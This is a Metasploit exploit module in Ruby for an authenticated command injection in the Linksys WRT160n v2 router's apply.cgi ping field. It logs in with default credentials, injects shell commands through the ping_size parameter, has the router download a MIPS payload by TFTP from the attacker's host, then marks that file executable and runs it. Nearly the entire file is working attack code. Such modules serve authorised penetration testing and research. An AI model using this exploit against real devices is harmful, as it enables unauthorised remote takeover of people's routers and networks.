require &#039;rex/proto/tftp&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Linksys WRT160nv2 apply.cgi Remote Command Injection&#039;,
      &#039;Description&#039; => %q{
          Some Linksys Routers are vulnerable to an authenticated OS command injection on
        their web interface where default credentials are admin/admin or admin/password.
        Since it is a blind OS command injection vulnerability, there is no output for the
        executed command when using the cmd generic payload. This module has been tested on
        a  Linksys WRT160n version 2 - firmware version v2.0.03. A ping command against a
        controlled system could be used for testing purposes. The exploit uses the tftp
        client from the device to stage to native payloads from the command injection.
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;BID&#039;, &#039;57887&#039; ],
          [ &#039;EDB&#039;, &#039;24478&#039; ],
          [ &#039;OSVDB&#039;, &#039;90093&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-012&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 11 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;linux&#039;,&#039;unix&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;CMD&#039;,
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Linux mipsel Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 1
      ))
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, &#039;admin&#039; ]),
        OptAddress.new(&#039;LHOST&#039;, [ true, &#039;The listen IP address from where the victim downloads the MIPS payload&#039; ]),
        OptString.new(&#039;DOWNFILE&#039;, [ false, &#039;Filename to download, (default: random)&#039; ]),
        OptInt.new(&#039;DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 10])
      ], self.class)
  end
 
 
  def request(cmd,user,pass,uri)
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;method&#039; => &#039;POST&#039;,
        &#039;authorization&#039; => basic_auth(user,pass),
        &#039;vars_post&#039; => {
          "submit_button" => "Diagnostics",
          "change_action" => "gozila_cgi",
          "submit_type" => "start_ping",
          "action" => "",
          "commit" => "0",
          "ping_ip" => "1.1.1.1",
          "ping_size" => "&#{cmd}&",
          "ping_times" => "5",
          "traceroute_ip" => ""
        }
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end
 
  def exploit
    downfile = datastore[&#039;DOWNFILE&#039;] || rand_text_alpha(8+rand(4))
    uri = &#039;/apply.cgi&#039;
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]
    lhost = datastore[&#039;LHOST&#039;]
 
    #
    # testing Login
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => uri,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end
 
    if target.name =~ /CMD/
      if not (datastore[&#039;CMD&#039;])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      res = request(cmd,user,pass,uri)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end
 
    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
 
    #
    # start our server
    #
    print_status("#{rhost}:#{rport} - Starting up our TFTP service")
    @tftp = Rex::Proto::TFTP::Server.new
    @tftp.register_file(downfile,@pl,true)
    @tftp.start
 
    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Linksys device to download #{downfile}")
    #this filename is used to store the payload on the device -> we have limited space for the filename!
    filename = rand_text_alpha_lower(4)
 
    #not working if we send all command together -> lets take three requests
    cmd = "tftp -l /tmp/#{filename} -r #{downfile} -g #{lhost}"
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
    # wait for payload download
    if (datastore[&#039;DOWNHOST&#039;])
      print_status("#{rhost}:#{rport} - Giving #{datastore[&#039;DELAY&#039;]} seconds to the Linksys device to download the payload")
      select(nil, nil, nil, datastore[&#039;DELAY&#039;])
    else
      wait_linux_payload
    end
    @tftp.stop
    register_file_for_cleanup("/tmp/#{filename}")
 
    #
    # chmod
    #
    cmd = "chmod 777 /tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Linksys device to chmod #{downfile}")
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
    #
    # execute
    #
    cmd = "/tmp/#{filename}"
    print_status("#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}")
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end
 
  end
 
  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")
 
    waited = 0
    while (not @tftp.files.length == 0)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;DELAY&#039;])
        @tftp.stop
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end
end

